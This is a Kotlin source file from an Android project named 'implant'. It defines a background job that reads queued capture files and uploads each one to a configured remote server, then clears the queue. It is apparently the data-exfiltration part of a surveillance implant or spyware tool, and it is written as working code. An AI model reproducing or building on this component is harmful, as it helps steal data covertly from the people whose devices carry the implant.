package com.cooperthecoder.implant.command.jobs

import com.cooperthecoder.implant.App
import com.cooperthecoder.implant.Config
import com.cooperthecoder.implant.data.UploadQueue
import com.evernote.android.job.Job
import okhttp3.Request
import okhttp3.RequestBody
import java.io.File

class UploadQueueJob : Job() {

    companion object {
        const val JOB_NAME: String = "clear_upload_queue"
    }

    override fun onRunJob(params: Params): Result {
        // Upload capture file to endpoint
        val client = (context.applicationContext as App).httpClient
        UploadQueue.files()
                .map {
                    Request.Builder()
                            .url(Config.HTTPS_ENDPOINT + "upload")
                            .post(RequestBody.create(null, File(it)))
                            .build()
                }
                .forEach { client.newCall(it).execute() }

        UploadQueue.clear()
        return Result.SUCCESS
    }

}